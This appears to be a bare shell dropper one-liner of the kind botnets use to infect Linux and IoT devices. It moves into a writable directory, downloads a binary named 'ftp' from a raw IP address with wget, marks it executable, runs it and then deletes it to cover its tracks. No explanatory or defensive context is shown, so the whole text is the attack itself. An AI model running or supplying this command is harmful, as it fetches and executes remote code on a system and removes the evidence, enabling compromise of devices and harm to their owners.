cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.107/ftp; chmod +x ftp; ./ftp; rm -rf ftp
